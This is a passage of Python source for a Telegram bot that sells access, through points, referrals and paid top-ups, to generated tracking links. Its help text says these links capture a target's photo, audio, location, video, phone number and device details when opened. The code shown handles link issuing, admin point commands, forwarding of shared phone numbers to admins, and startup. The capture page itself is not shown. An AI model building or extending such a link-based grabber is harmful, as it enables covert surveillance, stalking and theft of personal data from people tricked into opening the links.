        ])
    )

async def cmd_mypoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    get_user(user_id)
    await update.message.reply_text(mypoints_text(user_id), parse_mode="HTML", reply_markup=mypoints_inline(user_id))

# Admin commands
async def cmd_addpoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addpoints <user_id> <amount>")
        return
    target, amt = str(args[0]), int(args[1])
    get_user(target)
    add_points(target, amt)
    u = get_user(target)
    await update.message.reply_text(
        f"✅ <b>Points ထည့်ပြီး</b>\n👤 User: <code>{target}</code>\n💰 +{amt} pts\n💎 Total: {u['points']}",
        parse_mode="HTML"
    )

async def cmd_addall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = str(update.effective_user.id)
    if not is_admin(caller_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်")
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /addall <amount>")
        return
    amt = int(args[0])
    total_users = list(user_data.keys())
    if not total_users:
        await update.message.reply_text("❌ User မရှိသေးပါ")
        return
    await update.message.reply_text(f"⏳ User {len(total_users)} ယောက်ကို +{amt} pts ပေးနေသည်...", parse_mode="HTML")
    def notify_one(uid, pts, total_after):
        msg = (
            f"🎁 <b>Points လက်ဆောင် ရရှိပြီ! | Points Gift!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 +<b>{pts}</b> points ရပြီ!\n"
            f"💎 Total Points: <b>{total_after}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎉 Admin @KOEKOE4 မှ လက်ဆောင်ပေးသည်!"
        )
        send_telegram_message(uid, msg, effect_id=random_effect())
    for uid in total_users:
        add_points(uid, amt)
        u = get_user(uid)
        threading.Thread(target=notify_one, args=(uid, amt, u["points"]), daemon=True).start()
    await update.message.reply_text(f"✅ ပြီးပါပြီ! {len(total_users)} users +{amt} pts", parse_mode="HTML")

async def cmd_removepoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /removepoints <user_id> <amount>")
        return
    target, amt = str(args[0]), int(args[1])
    get_user(target)
    remove_points(target, amt)
    u = get_user(target)
    await update.message.reply_text(
        f"✅ <b>Points နှုတ်ပြီး</b>\n👤 User: <code>{target}</code>\n💰 -{amt} pts\n💎 Remaining: {u['points']}",
        parse_mode="HTML"
    )

async def cmd_adddays(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /adddays <user_id> <days>")
        return
    target, days = str(args[0]), int(args[1])
    get_user(target)
    add_access_days(target, days)
    await update.message.reply_text(
        f"✅ <b>Access ထည့်ပြီး</b>\n👤 User: <code>{target}</code>\n📅 +{days} day(s)\n⏰ {access_expires_str(target)}",
        parse_mode="HTML"
    )

async def cmd_checkuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /checkuser <user_id>")
        return
    target = str(args[0])
    u = get_user(target)
    await update.message.reply_text(
        f"👤 <b>User: <code>{target}</code></b>\n"
        f"📛 Name: {u.get('name','?')}\n"
        f"💰 Points: {u.get('points',0)}\n"
        f"👥 Referrals: {u.get('referrals',0)}\n"
        f"⏰ {access_expires_str(target)}",
        parse_mode="HTML"
    )

async def cmd_listusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်")
        return
    if not user_data:
        await update.message.reply_text("No users yet.")
        return
    lines = [f"👥 <b>Users ({len(user_data)})</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for uid, u in list(user_data.items())[:30]:
        exp = u.get("access_expires")
        status = "✅" if exp and exp > datetime.now() else "❌"
        lines.append(f"{status} <code>{uid}</code> | {u.get('name','?')} | 💰{u.get('points',0)} pts | 👥{u.get('referrals',0)}")
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")


# ---------- Text & Callback Handlers ----------
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    user_id = str(update.effective_user.id)
    get_user(user_id)

    MODE_MAP = {
        "🌐 All-in-One Link": ("all", "🌐 All-in-One"),
        "📸 Photo Link":       ("photo", "📸 Photo"),
        "🎤 Audio Link":       ("audio", "🎤 Audio"),
        "📍 Location Link":    ("location", "📍 Location"),
        "🎥 Video Link":       ("video", "🎥 Video"),
        "📞 Contact Link":     ("contact", "📞 Contact"),
    }

    if text in MODE_MAP:
        mode_key, label = MODE_MAP[text]
        if not has_access(user_id):
            await update.message.reply_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
            return
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        if mode_key == "all":
            await update.message.reply_text(format_links_msg(token), parse_mode="HTML", reply_markup=make_links_inline(token))
        else:
            await update.message.reply_text(
                format_single_link_msg(token, mode_key, label),
                parse_mode="HTML",
                reply_markup=single_link_inline(token, mode_key, label)
            )
    elif "Daily Bonus" in text:
        msg = daily_bonus_text(user_id)
        if not msg:
            u = get_user(user_id)
            await update.message.reply_text(
                f"⏰ <b>ယနေ့ Daily bonus ရပြီးပါပြီ</b>\n💎 Points: <b>{u['points']}</b>\n{access_expires_str(user_id)}\n\n📅 မနက်ဖြန် ထပ်ရယူနိုင်သည်",
                parse_mode="HTML")
        else:
            await update.message.reply_text(msg, parse_mode="HTML", reply_markup=mypoints_inline(user_id))
    elif "Refer" in text:
        u = get_user(user_id)
        link = refer_link(user_id)
        surl = refer_share_url(link)
        await update.message.reply_text(
            f"👥 <b>Refer & Earn</b>\n\nသင့် referral link:\n<code>{link}</code>\n\n"
            f"👤 Referred: <b>{u.get('referrals',0)}</b> ယောက်\n"
            f"🎁 တစ်ယောက် refer → +{REFER_BONUS_PTS} pts + 1 day",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)]
            ])
        )
    elif "My Points" in text or "Access" in text:
        await update.message.reply_text(mypoints_text(user_id), parse_mode="HTML", reply_markup=mypoints_inline(user_id))
    elif "Active Links" in text:
        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
        if not user_links:
            await update.message.reply_text("📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ", parse_mode="HTML")
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/v/{t}?m=all</code>" for t in user_links[-10:]])
            await update.message.reply_text(f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}", parse_mode="HTML")
    elif "Clear" in text or "ဖျက်" in text:
        if not is_admin(user_id):
            await update.message.reply_text("❌ <b>Admin သာ Links ဖျက်နိုင်သည်</b>\n\nဖျက်ရန် Admin ထံ ဆက်သွယ်ပါ @koekoe4", parse_mode="HTML")
            return
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
        await update.message.reply_text(f"🗑 <b>Admin Action</b>\nLink <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး", parse_mode="HTML")
    elif "Help" in text:
        await update.message.reply_text(
            "❓ <b>Help | အကူအညီ</b>\n\n"
            "<b>Links:</b>\n"
            "🌐 All → Phone+Audio+Location+Video+Device\n"
            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n📞 Contact → ဖုန်းနံပါတ်\n\n"
            "<b>Points system:</b>\n"
            f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
            f"👥 Refer → +{REFER_BONUS_PTS} pts + 1 day/ကိုယ်\n"
            f"💰 {PTS_PER_DAY} pts = 1 day access\n\n"
            "💳 <b>Bot အသုံးပြုနိုင်ရန် points များ ဝယ်ယူလိုပါက</b> 👉 @KOEKOE4\n\n"
            "<b>Admin commands:</b>\n"
            "/addall <pts> /addpoints /removepoints /adddays /checkuser /listusers",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text("🏠 <b>Main Menu</b>", parse_mode="HTML", reply_markup=main_menu_inline())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    data = query.data
    get_user(user_id)

    GEN_MODES = {
        "gen_all": ("all", "🌐 All-in-One"),
        "gen_photo": ("photo", "📸 Photo"),
        "gen_audio": ("audio", "🎤 Audio"),
        "gen_location": ("location", "📍 Location"),
        "gen_video": ("video", "🎥 Video"),
        "gen_contact": ("contact", "📞 Contact"),
    }

    if data in GEN_MODES:
        mode_key, label = GEN_MODES[data]
        if not has_access(user_id):
            await query.edit_message_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
            return
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        if mode_key == "all":
            await query.edit_message_text(format_links_msg(token), parse_mode="HTML", reply_markup=make_links_inline(token))
        else:
            await query.edit_message_text(
                format_single_link_msg(token, mode_key, label),
                parse_mode="HTML",
                reply_markup=single_link_inline(token, mode_key, label)
            )
    elif data == "menu":
        await query.edit_message_text("🏠 <b>Main Menu</b>", parse_mode="HTML", reply_markup=main_menu_inline())
    elif data == "daily":
        msg = daily_bonus_text(user_id)
        if not msg:
            u = get_user(user_id)
            msg = f"⏰ <b>ယနေ့ Daily bonus ရပြီးပါပြီ</b>\n💎 Points: <b>{u['points']}</b>\n{access_expires_str(user_id)}\n\n📅 မနက်ဖြန် ထပ်ရယူနိုင်သည်"
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=mypoints_inline(user_id))
    elif data == "refer":
        u = get_user(user_id)
        link = refer_link(user_id)
        surl = refer_share_url(link)
        await query.edit_message_text(
            f"👥 <b>Refer & Earn</b>\n\nသင့် referral link:\n<code>{link}</code>\n\n"
            f"👤 Referred: <b>{u.get('referrals',0)}</b> ယောက်\n"
            f"🎁 တစ်ယောက် → +{REFER_BONUS_PTS} pts + 1 day",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)],
                [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )
    elif data == "mypoints":
        await query.edit_message_text(mypoints_text(user_id), parse_mode="HTML", reply_markup=mypoints_inline(user_id))
    elif data == "redeem":
        pts = get_user(user_id).get("points", 0)
        if pts < PTS_PER_DAY:
            await query.answer(f"Points မလုံလောက်ပါ | Need {PTS_PER_DAY} pts", show_alert=True)
            return
        days = redeem_points(user_id)
        await query.edit_message_text(
            f"🔓 <b>Redeem ပြီးပါပြီ!</b>\n\n"
            f"📅 +{days} day(s) access ရပြီ!\n"
            f"⏰ {access_expires_str(user_id)}\n"
            f"💎 Points ကျန်: {get_user(user_id)['points']}",
            parse_mode="HTML",
            reply_markup=mypoints_inline(user_id)
        )
    elif data == "links":
        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
        if not user_links:
            txt = "📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ"
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/v/{t}?m=all</code>" for t in user_links[-10:]])
            txt = f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}"
        await query.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Links အသစ်", callback_data="gen_all"),
             InlineKeyboardButton("🗑 Clear", callback_data="clear")],
            [InlineKeyboardButton("🏠 Menu", callback_data="menu")]
        ]))
    elif data == "clear":
        if not is_admin(user_id):
            await query.answer("❌ Admin သာ ဖျက်နိုင်သည် | Admin only", show_alert=True)
            return
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
        await query.edit_message_text(
            f"🗑 <b>Admin Action</b>\nLink <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link အသစ်", callback_data="gen_all"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )
    elif data == "help":
        await query.edit_message_text(
            "❓ <b>Help | အကူအညီ</b>\n\n"
            f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
            f"👥 Refer တစ်ယောက် → +{REFER_BONUS_PTS} pts + 1 day\n"
            f"💰 {PTS_PER_DAY} pts = 1 day access\n\n"
            "🌐 All → Phone+Audio+Location+Video+Device\n"
            "📸/🎤/📍/🎥/📞 → single mode\n\n"
            "💳 <b>Bot အသုံးပြုနိုင်ရန် points များ ဝယ်ယူလိုပါက</b> 👉 @KOEKOE4",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link ထုတ်", callback_data="gen_all"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )


# ---------- Native Contact Handler (optional) ----------
async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.effective_message.contact
    if not contact:
        return
    user_id = str(update.effective_user.id)
    phone = contact.phone_number
    text = f"📞 <b>Native Phone Share</b>\n\n👤 User <code>{user_id}</code>\n📞 Phone: <code>{phone}</code>"
    for aid in ADMIN_IDS:
        await context.bot.send_message(aid, text, parse_mode="HTML")
    await update.message.reply_text("✅ ကျေးဇူးပါ။ သင့်ဖုန်းနံပါတ် လက်ခံရရှိပါပြီ။")


# ---------- Run ----------
def run_bot():
    if not BOT_TOKEN:
        print("⚠️  BOT_TOKEN not set.")
        return
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("grab", grab))
    app.add_handler(CommandHandler("daily", cmd_daily))
    app.add_handler(CommandHandler("refer", cmd_refer))
    app.add_handler(CommandHandler("mypoints", cmd_mypoints))
    app.add_handler(CommandHandler("addpoints", cmd_addpoints))
    app.add_handler(CommandHandler("addall", cmd_addall))
    app.add_handler(CommandHandler("removepoints", cmd_removepoints))
    app.add_handler(CommandHandler("adddays", cmd_adddays))
    app.add_handler(CommandHandler("checkuser", cmd_checkuser))
    app.add_handler(CommandHandler("listusers", cmd_listusers))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    print("🤖 Bot polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        flask_app.run(host="0.0.0.0", port=port, threaded=True, debug=False)

    if BOT_TOKEN:
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        run_bot()
    else:
        print("⚠️  BOT_TOKEN not set. Flask only.")
        run_flask()
